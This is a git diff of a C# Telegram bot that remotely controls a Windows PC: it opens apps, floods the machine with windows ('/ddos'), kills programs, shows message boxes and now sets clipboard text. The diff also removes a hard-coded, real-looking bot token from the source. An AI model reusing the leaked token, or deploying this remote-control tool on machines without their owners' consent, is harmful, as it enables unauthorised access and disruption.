@@ -8,10 +8,11 @@ using Telegram.Bot;
 using Telegram.Bot.Types;
 using Telegram.Bot.Types.ReplyMarkups;
 using System.Drawing;
+using System.Security.Cryptography;
 
 namespace tg_bot_controler
 {
-    internal class Program
+    internal class TelegramBot
     {
 
 
@@ -25,6 +26,9 @@ namespace tg_bot_controler
         static string awaitingDDoS2ChatId = null;
         static string awaitingKillProgrammChatId = null;
         static string awaitingSendMessageBoxChatId = null;
+        static string awaitingSetClipboardTextChatId = null;
+
+        static long AdminID = {AdminID};
 
         static string mainmenu = "Выберите, что хотите сделать: " +
                      "\n /launch - открытие сайта или системного приложения " +
@@ -35,7 +39,8 @@ namespace tg_bot_controler
                      "\n /ddos - открытие большого кол-ва приложений" +
                      "\n /getactiveprogramms - выводит список активных программ" +
                      "\n /killprogramm - завершение работы программы" +
-                     "\n /sendmessage - отправка окошка с сообщением(бот перестанет работать, пока пользователь не закроет окно с сообщением)";
+                     "\n /sendmessage - отправка окошка с сообщением(бот перестанет работать, пока пользователь не закроет окно с сообщением)" +
+                     "\n /setclipboardtext - установка текста в буфер обмена";
 
         //кол-во запусков ддос
         static int DDoScount = 0;
@@ -57,9 +62,10 @@ namespace tg_bot_controler
 
 
 
+
         static void Main(string[] args)
         {
-            var bot = new TelegramBotClient("7392660717:AAHqY-9JjNcsfoT6A6vsDokkoaR-C0K0KX0");
+            var bot = new TelegramBotClient("API bot");
             Console.WriteLine("Bot Started");
 
             bot.StartReceiving(update, error);
@@ -67,6 +73,7 @@ namespace tg_bot_controler
 
             Console.ReadLine();
         }
+
 
         private static async Task update(ITelegramBotClient client, Update update, CancellationToken token)
         {
@@ -77,6 +84,13 @@ namespace tg_bot_controler
                 Console.WriteLine(message.Chat.Username + ": " + message.Text);
             }
             else Console.WriteLine(message.Chat.Id + ": " + message.Text);
+
+            if(chatId != AdminID)
+            {
+                Console.WriteLine("произведена попытка воспользоваться ботом");
+                client.SendTextMessageAsync(AdminID, $"произведена попытка воспользоваться ботом. \n NickName : {message.Chat.Username} \nID пользователя : { chatId.ToString()} \n Текст сообщения { message.Text} ");
+                return;
+            }
 
             //открытие URL
             if (awaitingUrlChatId != null && awaitingUrlChatId == chatId.ToString())
@@ -125,7 +139,7 @@ namespace tg_bot_controler
                     return;
                 }
             }
-            
+
             //DDos part2
             if (awaitingDDoS2ChatId != null && awaitingDDoS2ChatId == chatId.ToString())
             {
@@ -149,6 +163,34 @@ namespace tg_bot_controler
                 {
                     Console.WriteLine(e.Message);
                     await client.SendTextMessageAsync(chatId, "❌что-то пошло нет так. Для возврата напишите /return или попробуйте заново");
+                    return;
+                }
+            }
+
+            if(awaitingSetClipboardTextChatId != null && awaitingSetClipboardTextChatId == chatId.ToString())
+            {
+                try
+                {
+                    if (CheckReturn(message.Text, chatId, client))
+                    {
+                        return;
+                    }
+                    var data = new DataObject();
+                    data.SetData(DataFormats.UnicodeText, true, message.Text);
+                    var thread = new Thread(() => Clipboard.SetDataObject(data, true));
+                    thread.SetApartmentState(ApartmentState.STA);
+                    thread.Start();
+                    thread.Join();
+                    Console.WriteLine("buffer set text");
+                    await client.SendTextMessageAsync(chatId, "✅текст успешно сохранен в буффер обмена");
+                    awaitingSetClipboardTextChatId = null;
+                    ReturnToHome(chatId, client);
+                    return;
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                    await client.SendTextMessageAsync(chatId, "❌что-то пошло нет так. Для возврата напишите /return или попробуйте вставить URl заново");
                     return;
                 }
             }
@@ -287,7 +329,6 @@ namespace tg_bot_controler
                     {
                         return;
                     }
-                    Console.WriteLine("sada");
                     SoundPlayer soundPlayer = new SoundPlayer();
                     soundPlayer.SetOutputDevice();
                     awaitingSetOutputDeviceChatId = null;
@@ -296,7 +337,6 @@ namespace tg_bot_controler
                 catch (Exception e)
                 {
                     Console.WriteLine(e.Message);
-                    await client.SendTextMessageAsync(chatId, "dfsfsfsdfsdfsdfsdfsdfsdsdfsdfsdfsdfsdfsdfsdfsdfdsfsdfsdfsd");
                     return;
                 }
             }
@@ -351,6 +391,13 @@ namespace tg_bot_controler
                     {
                         await client.SendTextMessageAsync(chatId, "напишите URL сайта или путь к приложению");
                         awaitingUrlChatId = chatId.ToString();
+                        return;
+                    }
+
+                    if(message.Text == "/setclipboardtext")
+                    {
+                        await client.SendTextMessageAsync(chatId, "Введите текст");
+                        awaitingSetClipboardTextChatId = chatId.ToString();
                         return;
                     }
 
@@ -463,7 +510,7 @@ namespace tg_bot_controler
             {
                 ResizeKeyboard = true
             };*/
-            await client.SendTextMessageAsync(chatID, mainmenu, replyMarkup: replyKeyboardMarkup);
+            //await client.SendTextMessageAsync(chatID, mainmenu, replyMarkup: replyKeyboardMarkup); // временно удалено -----------------------------------------
             awaitingPlaySoundChatId = null;
             awaitingUrlChatId = null;
             awaitingDDoS1ChatId = null;
@@ -472,6 +519,7 @@ namespace tg_bot_controler
             awaitingSetOutputDeviceChatId = null;
             awaitingSetWallpaperChatId = null;
             awaitingSendMessageBoxChatId = null;
+            awaitingSetClipboardTextChatId = null;
         }
 
         private static Task error(ITelegramBotClient client, Exception exception, CancellationToken token)
